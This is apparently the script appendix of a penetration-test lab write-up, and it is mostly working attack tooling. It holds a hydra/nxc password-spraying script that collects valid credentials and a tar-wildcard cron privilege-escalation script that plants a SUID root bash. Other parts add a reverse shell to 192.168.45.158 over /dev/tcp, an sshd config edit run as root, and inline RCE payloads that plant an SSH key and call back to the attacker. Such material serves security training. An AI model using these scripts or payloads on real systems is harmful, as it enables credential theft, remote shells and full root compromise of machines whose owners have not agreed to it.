#-------------------------------- spray stage --------------------------------
hydra_svc() { case $1 in ldap) echo ldap2;; smb|winrm) echo "";; *) echo "$1";; esac; }

sprayer_for() { # proto -> hydra|nxc|none
  case "$FORCE_SPRAYER" in
    hydra) echo hydra; return;;
    nxc)   echo nxc;   return;;
  esac
  if [[ -n $HYDRA ]]; then echo hydra; return; fi
  if [[ -n $NXC   ]]; then echo nxc;   return; fi
  echo none
}

run_hydra() { # proto ip port password
  local proto=$1 ip=$2 port=$3 pw=$4 svc
  svc=$(hydra_svc "$proto")
  [[ -n $svc ]] || { echo "[!] hydra has no module for $proto"; return 2; }
  if [[ $proto == vnc ]]; then
    "$HYDRA" -I -P <(printf '%s\n' "$pw") -s "$port" -t 1 -w "$TIMEOUT" "$ip" vnc 2>&1
    return $?
  fi
  "$HYDRA" -I -L "$USERS_NORM" -p "$pw" -s "$port" -t "$THREADS" -w "$TIMEOUT" \
           "$ip" "$svc" 2>&1
  return $?
}

run_nxc() { # proto ip port password
  local proto=$1 ip=$2 port=$3 pw=$4
  local aux="$OUT/norm/.pw_one"
  printf '%s\n' "$pw" > "$aux"
  "$NXC" "$proto" "$ip" -u "$USERS_NORM" -p "$aux" --continue-on-success --port "$port" 2>&1
  local rc=$?
  rm -f "$aux"
  return $rc
}

spray_service() { # proto ip port
  local proto=$1 ip=$2 port=$3
  local log="$OUT/logs/${ip//[^A-Za-z0-9._-]/_}_${port}_${proto}.log"
  local tool; tool=$(sprayer_for "$proto")
  local rounds=0 evidence=0 errors=0 hits=0 rc pw
  : > "$log"

  msg "spray $proto $ip:$port  (tool: $tool)"

  if [[ $tool == none ]]; then
    printf '%s\t%s\t%s\t%s\t%s\n' "$proto" "$ip" "$port" "INCONCLUSIVE" "no sprayer available" >> "$VERDICTS"
    warn "  no sprayer available - $proto $ip:$port not tested"
    return 0
  fi

  if (( DRY == 1 )); then
    sub "[dry-run] $(wc -l < "$USERS_NORM") users x $(wc -l < "$PASS_NORM") passwords"
    return 0
  fi

  while IFS= read -r pw; do
    [[ -n $pw ]] || continue
    rounds=$((rounds + 1))
    printf '\n##### round %d/%d #####\n' "$rounds" "$(wc -l < "$PASS_NORM")" >> "$log"

    local out
    if [[ $tool == hydra ]]; then
      out=$(run_hydra "$proto" "$ip" "$port" "$pw"); rc=$?
    else
      out=$(run_nxc "$proto" "$ip" "$port" "$pw"); rc=$?
    fi
    printf '%s\n' "$out" >> "$log"

    # evidence that the sprayer really attempted logins this round
    if [[ $tool == hydra ]]; then
      grep -q 'login tries' <<<"$out" && evidence=$((evidence + 1))
    else
      grep -qE '\[[+-]\] ' <<<"$out" && evidence=$((evidence + 1))
    fi
    (( rc != 0 )) && { errors=$((errors + 1));
      printf '%s\t%s\t%s\trc=%s round=%s\n' "$proto" "$ip" "$port" "$rc" "$rounds" >> "$ERRORS"; }

    # collect successful logins
    while IFS= read -r line; do
      [[ -n $line ]] || continue
      printf '%s\t%s\t%s\t%s\n' "$proto" "$ip" "$port" "$line" >> "$HITS"
      ok "  HIT  $proto $ip:$port  $line"
      hits=$((hits + 1))
    done < <(grep -F 'login:' <<<"$out" | sed 's/^[[:space:]]*//')
  done < "$PASS_NORM"

  local verdict
  if   (( hits > 0 ));        then verdict="HIT"
  elif (( evidence == 0 ));   then verdict="INCONCLUSIVE"
  elif (( errors >= rounds )); then verdict="INCONCLUSIVE"
  elif (( errors > 0 ));      then verdict="PARTIAL"
  else                             verdict="CLEAN"
  fi
  printf '%s\t%s\t%s\t%s\t%s/%s rounds, %s hit(s), %s evidence round(s), %s error(s)\n' \
    "$proto" "$ip" "$port" "$verdict" "$rounds" "$rounds" "$hits" "$evidence" "$errors" >> "$VERDICTS"

  case "$verdict" in
    HIT)          ok "  $proto $ip:$port -> HIT ($hits credential pair(s))";;
    CLEAN)        sub "  $proto $ip:$port -> CLEAN (all $rounds round(s) really ran)";;
    PARTIAL)      warn "  $proto $ip:$port -> PARTIAL ($errors/$rounds round(s) errored, no hit) - see $log";;
    INCONCLUSIVE) warn "  $proto $ip:$port -> INCONCLUSIVE (see $log) - do NOT read this as 'no creds'";;
  esac
}

spray_all() {
  if (( DO_SPRAY == 0 )); then
    warn "spray skipped - users.txt or pass.txt is empty"
    return 0
  fi
  local count; count=$(wc -l < "$PLAN")
  if (( count == 0 )); then
    warn "nothing sprayable in the scan results"
    return 0
  fi
  hr
  msg "spray plan: $count service(s), $(wc -l < "$USERS_NORM") user(s) x $(wc -l < "$PASS_NORM") password(s)"
  local ip port proto
  while IFS="$TAB" read -r ip port proto; do
    [[ -n ${ip:-} ]] || continue
    spray_service "$proto" "$ip" "$port"
  done < "$PLAN"
}

#-------------------------------- report -------------------------------------
report() {
  local hits=0 svcs=0
  [[ -s $HITS ]] && hits=$(wc -l < "$HITS")
  [[ -s $SERVICES_TSV ]] && svcs=$(wc -l < "$SERVICES_TSV")

  {
    printf '# enum_spray_2 report - %s\n\n' "$(date '+%Y-%m-%d %H:%M:%S %Z')"
    printf '| item | value |\n|---|---|\n'
    printf '| input dir | `%s` |\n' "$INPUT_DIR"
    printf '| targets | %s |\n' "$(wc -l < "$IPS_NORM" 2>/dev/null || echo 0)"
    printf '| users | %s |\n' "$(wc -l < "$USERS_NORM" 2>/dev/null || echo 0)"
    printf '| passwords | %s |\n' "$(wc -l < "$PASS_NORM" 2>/dev/null || echo 0)"
    printf '| open ports | %s |\n' "$svcs"
    printf '| hits | %s |\n\n' "$hits"

    printf '## Open services\n\n'
    if (( svcs > 0 )); then
      printf '| host | port | service | product / version |\n|---|---|---|---|\n'
      while IFS="$TAB" read -r a p pr s prod ver; do
        [[ -n ${a:-} ]] || continue
        printf '| %s | %s/%s | %s | %s %s |\n' "$a" "$p" "$pr" "$s" "$prod" "$ver"
      done < "$SERVICES_TSV"
    else
      printf '_none recorded_\n'
    fi

    printf '\n## Verdicts\n\n'
    if [[ -s $VERDICTS ]]; then
      printf '| protocol | host | port | verdict | detail |\n|---|---|---|---|---|\n'
      while IFS="$TAB" read -r pr a p v d; do
        [[ -n ${pr:-} ]] || continue
        printf '| %s | %s | %s | **%s** | %s |\n' "$pr" "$a" "$p" "$v" "$d"
      done < "$VERDICTS"
    else
      printf '_nothing sprayed_\n'
    fi

    printf '\n## Valid credentials\n\n'
    if (( hits > 0 )); then
      printf '```\n'; cat "$HITS"; printf '```\n'
    else
      printf '_none_\n'
    fi

    if [[ -s $ERRORS ]]; then
      printf '\n## Sprayer errors\n\n```\n'; cat "$ERRORS"; printf '```\n'
    fi
  } > "$REPORT"

  printf 'protocol\thost\tport\tsuccess\n' > "$OUT/results/hits.csv"
  cat "$HITS" >> "$OUT/results/hits.csv" 2>/dev/null

  msg "report: $REPORT"
}

summary() {
  hr
  printf '%s RESULTS %s\n' "$C_BLD" "$C_R"
  sub "open ports : $(wc -l < "$SERVICES_TSV" 2>/dev/null || echo 0)"
  sub "sprayed    : $(wc -l < "$PLAN" 2>/dev/null || echo 0) service(s)"
  sub "hits       : $([[ -s $HITS ]] && wc -l < "$HITS" || echo 0)"
  if [[ -s $HITS ]]; then hr; sed 's/^/      /' "$HITS"; fi
  hr
  sub "output     : $OUT"
}

#-------------------------------- main ---------------------------------------
main() {
  printf '%s\n' "${C_BLD}${PROG} v${VERSION}${C_R}"
  preflight
  resolve_inputs
  make_dirs
  normalize_inputs
  msg "input folder: $INPUT_DIR"

  if [[ ! -s $IPS_NORM ]]; then
    warn "ips.txt has no usable target - nothing to do"
    report; summary; exit 1
  fi

  scan
  build_plan
  spray_all
  report
  summary
}
main "$@"
```

## 8.6 `privesc_tar_wildcard_7f3a.sh`

Run as cassie on the target. Plants `pwn.sh` plus the two `--checkpoint` filenames in `/opt/admin`, optionally appends a root callback, then waits for the 2-minute cron tick and reports when `rootbash` appears.

*68 lines, 2140 bytes.*

```bash
#!/usr/bin/env bash
# privesc_tar_wildcard_7f3a.sh
#
# Run as cassie ON the target. Plants the three files that turn
#   */2 * * * * root cd /opt/admin && tar -zxf /tmp/backup.tar.gz *
# into a root command execution, then waits for the cron tick.
#
#   ./privesc_tar_wildcard_7f3a.sh            # default: SUID bash + flag copy
#   ./privesc_tar_wildcard_7f3a.sh 192.168.45.158 1377   # also try a root callback
#
# The reverse shell is optional and relies on egress to your host, which is not
# guaranteed on this range. The SUID copy and the flag copy do not.
set -u

LHOST="${1:-}"
LPORT="${2:-1377}"
TARGET_DIR="/opt/admin"

if [ ! -d "$TARGET_DIR" ]; then
  echo "[-] $TARGET_DIR does not exist" >&2
  exit 1
fi
if [ ! -w "$TARGET_DIR" ]; then
  echo "[-] $TARGET_DIR is not writable by $(id -un)" >&2
  exit 1
fi

cd "$TARGET_DIR" || exit 1

# ---- the script the cron job will run as root ------------------------------
cat > pwn.sh <<'EOF'
#!/bin/sh
# Runs as root, cwd = /opt/admin
cp /bin/bash /home/cassie/rootbash
chmod 4755 /home/cassie/rootbash
cp /root/proof.txt /home/cassie/proof.txt 2>/dev/null
chmod 644 /home/cassie/proof.txt 2>/dev/null
ls -b1 / > /home/cassie/root_ls.txt 2>&1
EOF
chmod +x pwn.sh

# optional: append a root callback when a listener address was supplied
if [ -n "$LHOST" ]; then
  printf "bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1' &\n" "$LHOST" "$LPORT" >> pwn.sh
fi

# ---- the two arguments tar will mistake for options ------------------------
# Glob expansion never word-splits, so the spaces inside the second filename
# survive as one argv entry: --checkpoint-action=exec=sh pwn.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh pwn.sh'

echo "[+] planted in $TARGET_DIR:"
ls -b1

echo
echo "[*] waiting for the 2-minute cron tick (Ctrl-C is safe, the job stays armed)"
for i in $(seq 1 30); do
  if [ -u /home/cassie/rootbash ]; then
    echo "[+] rootbash is SUID after ~$((i * 10))s"
    ls -l /home/cassie/rootbash /home/cassie/proof.txt 2>/dev/null
    exit 0
  fi
  sleep 10
done

echo "[-] no rootbash after 5 minutes - check /var/log/syslog for the CRON line" >&2
exit 1
```

## 8.7 `unblock_sshd_7f3a.sh`

Run as root. Backs up `/etc/ssh/sshd_config`, removes the `DenyUsers` line naming the account, validates with `sshd -t`, and only then restarts ssh. Restores the backup if the config is rejected.

*45 lines, 1441 bytes.*

```bash
#!/usr/bin/env bash
# unblock_sshd_7f3a.sh
#
# Run as root ON the target (e.g. /home/cassie/rootbash -p -c 'bash unblock_sshd_7f3a.sh').
#
# Removes the `DenyUsers cassie` line that makes every SSH attempt fail before
# authentication, backs the file up first, and refuses to restart sshd unless
# `sshd -t` accepts the new config.
set -u

USER_NAME="${1:-cassie}"
CONF=/etc/ssh/sshd_config
BAK="/home/${USER_NAME}/sshd_config.bak"

if [ "$(id -u)" -ne 0 ]; then
  echo "[-] must run as root" >&2
  exit 1
fi

if ! grep -qiE "^[[:space:]]*DenyUsers[[:space:]].*\b${USER_NAME}\b" "$CONF"; then
  echo "[*] no DenyUsers entry for ${USER_NAME} - nothing to remove"
else
  cp -a "$CONF" "$BAK" || exit 1
  echo "[+] backup: $BAK"

  # delete only the DenyUsers line(s) that name this account
  tmp=$(mktemp)
  grep -viE "^[[:space:]]*DenyUsers[[:space:]].*\b${USER_NAME}\b" "$CONF" > "$tmp"
  cat "$tmp" > "$CONF"          # in place: keeps owner, mode and inode
  rm -f "$tmp"
  echo "[+] removed DenyUsers ${USER_NAME} from $CONF"
fi

if /usr/sbin/sshd -t; then
  echo "[+] sshd -t: config OK"
else
  echo "[-] sshd -t rejected the config - restoring the backup" >&2
  [ -f "$BAK" ] && cat "$BAK" > "$CONF"
  exit 1
fi

systemctl restart ssh 2>/dev/null || service ssh restart
echo "[+] ssh restarted"
echo
grep -vE '^[[:space:]]*#' "$CONF" | grep -vE '^[[:space:]]*$' | grep -iE 'denyusers|allowusers|permitrootlogin|pubkeyauth|passwordauth'
```

## 8.8 Inline payloads used through the RCE

Not every payload needs a file. These were passed to `--payload` and are worth keeping, because the
quoting is the hard part.

```bash
# prove execution, read the result back over FTP
--payload 'id > /home/cassie/exec_test.txt 2>&1;'

# write an SSH key without any shell metacharacter surviving the gpg UID
KEY=$(base64 -w0 ~/.ssh/charlie.pub)
--payload "echo $KEY|base64 -d>/home/cassie/.ssh/authorized_keys;"

# plain callback, no FIFO, so a failure is unambiguous
--payload 'bash -c "bash -i >& /dev/tcp/192.168.45.158/1377 0>&1" &'
```

Every one of them ends in `;`. The wrapper appends `echo "` immediately after the payload, so a
payload ending in `2>&1` becomes `2>&1echo "` and `/bin/sh` fails with `Bad fd number` before
running anything.

## 8.9 The two commands that were the whole privesc

```bash
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh pwn.sh'
```

Everything in chapter 06 is an explanation of why these two filenames give root.
